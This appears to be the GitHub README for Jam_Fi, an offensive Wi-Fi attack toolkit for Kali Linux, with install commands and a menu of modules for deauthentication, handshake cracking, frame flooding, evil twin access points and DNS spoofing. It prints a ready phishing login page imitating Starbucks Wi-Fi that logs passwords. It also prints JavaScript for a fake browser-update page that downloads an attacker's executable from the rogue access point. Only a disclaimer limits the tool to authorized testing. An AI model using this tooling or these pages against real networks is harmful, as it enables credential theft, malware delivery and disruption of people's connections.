# Jam_Fi – Wi-Fi Chaos Tool  
by [@ekomsSavior]

---

![image3](https://github.com/user-attachments/assets/960cce0f-7854-4080-b977-b0a02fb34418)


## What is Jam_Fi?

Jam_Fi is an offensive wireless toolkit for Kali Linux, built for red team simulation, network disruption research, and Wi-Fi exploitation education. It includes modules for:

- Deauthentication attacks
- WPA handshake capture and cracking
- Probe request and junk frame flooding
- Evil twin access points with credential logging
- Karma responder beacon spoofing
- MITM injection with fake update pages
- Custom captive portals and payload delivery

All features are designed for local lab use and legal environments only.

---

## Installation

Clone the repository

```bash
git clone https://github.com/ekomsSavior/Jam_Fi.git
cd Jam_Fi
```

Install dependencies

```bash
sudo apt update
sudo apt install -y aircrack-ng hostapd dnsmasq dnsspoof python3-scapy
```

Run the tool:

```bash
sudo python3 jam_fi.py
```

To update later:

```bash
cd Jam_Fi
git pull
```

---

## Interface Modes: Monitor vs Managed

Some Jam_Fi modules require **monitor mode**, while others require **managed mode**.

### Monitor Mode (e.g. wlan0mon)

Required for:

- Scan Clients & APs  
- Deauth One Client  
- Deauth All Clients  
- Probe Request Spam  
- Junk Packet Flood  
- Karma Responder  
- Chaos Mode  
- MITM HID Injection

Enable with:

```bash
sudo airmon-ng start wlan0
```

Your monitor interface will usually be called `wlan0mon`.

---

### Managed Mode (e.g. wlan0)

Required for

- Evil AP  
- Captive portal phishing  
- DNS redirection  
- Loot viewing  
- Cracking captured handshakes (optional)

Switch back with

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

---

## Jam_Fi Modules Overview

Each module appears in the menu

```
1  Scan Clients & APs
2  Deauth One Client
3  Deauth All Clients + Capture
4  Crack Captured Handshakes
5  Probe Request Spam
6  Junk Packet Flood
7  Karma Responder
8  Chaos Mode
9  View Loot
10 Evil AP
11 MITM HID Injection
0  Quit
```

Descriptions

- **Scan Clients & APs** – Uses Scapy to sniff for access points and associated clients.
- **Deauth One Client** – Sends deauth packets to a target MAC on a given AP.
- **Deauth ALL Clients + Capture** – Deauths all known clients while capturing WPA handshakes.
- **Crack Captured Handshakes** – Runs Aircrack-ng or Hashcat against captured `.pcap` files.
- **Probe Request Spam** – Broadcasts fake SSIDs based on common public networks.
- **Junk Packet Flood** – Sends randomized frames to clutter the spectrum.
- **Karma Responder** – Replies to probe requests with fake beacons.
- **Chaos Mode** – Combines probe spam, junk flood, and karma attack.
- **View Loot** – Shows saved handshakes and credentials in `loot/`.
- **Evil AP** – Launches a rogue access point with credential logging and DNS spoofing.
- **MITM HID Injection** – Fakes a “driver install” page using beacon spoof + JavaScript.

---

## The `loot/` Folder

JamFi auto-generates files inside `loot/` for phishing and payload delivery:

| File                | Purpose                                                |
|---------------------|--------------------------------------------------------|
| `index.html`        | Default captive portal homepage                        |
| `login.html`        | Fake login form with credential capture                |
| `creds.txt`         | Logged usernames and passwords                         |
| `phish_server.py`   | Simple Python server to collect form submissions       |
| `injection.html`    | Fake update/payload download page for MITM injection   |
| `hostapd.conf`      | Config file for starting the evil AP                   |
| `dnsmasq.conf`      | Handles DHCP and DNS for rogue AP                      |
| `dnsspoof_hosts`    | Redirects all DNS queries to local attacker IP         |
| `hotspot-detect.html` | Triggers captive portal on iOS/macOS                 |

---

## Evil AP Customization

Edit `loot/login.html` to create a custom phishing page:

```html
<h2>Welcome to Starbucks Free Wi-Fi</h2>
<p>Please sign in to continue</p>
<form method="POST" action="/login">
  <input type="text" name="username" placeholder="Email"><br>
  <input type="password" name="password" placeholder="Wi-Fi Password"><br>
  <input type="submit" value="Connect">
</form>
```

Captured credentials are logged to `loot/creds.txt`.

---

## MITM Fake Update Injection

You can simulate a fake update prompt with `loot/injection.html`:

```html
<h2>Browser Update Required</h2>
<p>To continue browsing, please install the latest security patch.</p>
<button onclick="downloadUpdate()">Update Now</button>

<script>
function downloadUpdate() {
  const a = document.createElement('a');
  a.href = 'http://10.0.0.1/fake_update.exe';
  a.download = 'update.exe';
  document.body.appendChild(a);
  a.click();
}
</script>
```

Add your own payloads to the `loot/` directory and they will auto-download when the button is clicked.

---

## Disclaimer

Jam_Fi is provided for **educational and authorized security research only**.

Do not use this tool against networks or devices you do not own or have permission to test.

Use responsibly, ethically, and within legal boundaries.

---

## About

Jam_Fi is an open-source red team utility developed by [@ekomsSavior](https://github.com/ekomsSavior).

If you find it useful, consider starring the repo and contributing responsibly.


